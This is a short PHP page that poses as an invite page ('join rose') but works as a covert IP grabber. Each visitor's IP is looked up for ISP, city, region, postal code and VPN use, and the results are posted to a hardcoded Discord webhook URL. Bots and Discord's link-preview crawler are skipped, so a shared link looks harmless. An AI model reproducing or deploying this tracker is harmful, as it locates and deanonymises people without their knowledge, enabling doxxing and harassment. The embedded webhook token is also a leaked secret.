 <?php

        $webhookurl = "https://discord.com/api/webhooks/943990737509437471/WJCB29HZFtfnqn71b5IiddJsskLvHHeGvkplxRy9IARwNbx32l2l_BYqD9NCbACIM2BI";

        $ip = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
        $browser = $_SERVER['HTTP_USER_AGENT'];
        if(preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $browser)) {
            exit();
        }
        $TheirDate = date('d/m/Y');
        $TheirTime = date('G:i:s');
        $details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
        $vpnCon = json_decode(file_get_contents("https://json.geoiplookup.io/{$ip}"));
        if($vpnCon->connection_type==="Corporate"){
            $vpn = "Yes (Double Check: $details->isp)";
        }else{
            $vpn = "No (Double Check: $details->isp)";
        }
        $flag = "https://www.countryflags.io/{$details->countryCode}/shiny/64.png";
        $data = "**User IP:** $ip\n**ISP:** $details->isp\n**Date:** $TheirDate\n**Time:** $TheirTime \n**Location:** $details->city \n**Region:** $details->region\n**Country** $details->country\n**Postal Code:** $details->zip\n**IsVPN?** $vpn  (Possible False-Postives)";

        $json_data = array ('content'=>"$data", 'username'=>"Vistor Visited From: $details->country", 'avatar_url'=> "$flag");
        $make_json = json_encode($json_data);
        $ch = curl_init( $webhookurl );

        curl_setopt( $ch, CURLOPT_POST, 1);
        curl_setopt( $ch, CURLOPT_POSTFIELDS, $make_json);
        curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt( $ch, CURLOPT_HEADER, 0);
        curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

        $response = curl_exec( $ch );

?>

<html>
  <head>
     <meta charset="utf-8">
        <title>shitty northwind rose invite machine</title>  
   
  </head>
  <body>
    <h1>join rose</h1>
   
    
  </body>
 
</html>
